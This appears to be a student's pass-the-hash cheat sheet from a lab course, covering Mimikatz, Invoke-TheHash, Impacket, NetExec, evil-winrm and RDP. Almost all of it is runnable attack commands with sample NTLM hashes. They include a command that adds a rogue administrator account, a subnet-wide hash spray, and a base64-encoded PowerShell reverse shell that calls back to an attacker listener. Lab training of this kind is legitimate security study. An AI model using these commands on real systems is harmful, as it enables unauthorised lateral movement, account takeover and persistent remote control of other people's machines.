Extracted the hash already, eg.
- Dumped local SAM database from compromised host
- Extract hash from ntds.dit on a DC
- Pull hashes from memory (lsass.exe)

# Windows NTLM

## Mimikatz
- Done from **compromised windows target** (eg. found more credentials on the target and want to impersonate him with the hash)
- `mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
	- /user: user we want to impersonate
	- /rc4 or /NTLM : ntlm hash
	- /domain: domain the user to impersonate belongs to
	- /run: the program we want to run (if not specified, runs cmd.exe)

# PowerShell Invoke-TheHash
Done from **WINDOWS "attack host".
- Can specify SMB or WMI command execution
- Use case: Have access to one Windows target, want to logon as a user (with remote shell) on a different machine with his hash.
	- See example below, where we logon to DC01 from the Windows machine we have pwned.

- `cd C:\tools\Invoke-TheHash\`
- `Import-Module .\Invoke-TheHash.psd1`
- `Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose`
	- This version is with SMB. 
		- Can invoke with WMI with `Invoke-WMIExec` also.
	- Target: hostname/IP address of target
	- Username: username to authenticate
	- Domain: domain for authenticaition. Unnecessary with local accounts/when using @domain after username
	- Hash: NTLM password hash. Accepts LM:L:NTLM or NTLM format
	- Command: Command to aexecute on target. If not specified, checks to see if username and hash have access to WMI on target
		- Can input reverse shell as the command (see below)

- Can also get reverse shell connection in target machine
	1. Start listener using Netcat on **OUR** Windows machine
		- `.\nc.exe -lvnp 8001`
	2. Visit revshells.com, set IP to Windows IP and port to 8001, select Powershell #3 (Base 64)
	3. ` Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="`
		- The long string is the reverse shell

## PtH with Impacket (Linux)
- Done from **Linux Attack Host**

Impacket PsExec
- `impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453`
	- Also can use impacket-wmiexec, impacket-atexec, impacket-smbexec

NetExec
- Try to authenticate to some/all hosts in network, looking for one we can authenticate successfully as local admin
- `netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453`
	- scans all hosts in that subnet, attempts SMB authentication with username `Administrator`
	- `-d .` : use the 'local machine' domain, ie. authenticate against each host's local SAM, not Windows AD domain
	- `-x` : for commands
	- `--local-auth` : attempt to authenticate to each host in subnet using local adminstrator password hash

Evil-winrm
- `evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

RDP
- Conditions
	- Restricted Admin Mode, which is disabled by default, should be enabled on the target host
		- If not get some error on Account restrictions preventing user from signing in
	- Can be done with 
		- `c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
			- Do this on the Windows target
		- If check registry editor after this, going to Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa, should see `DisableRestrictedAdmin` set to 0
-  `xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B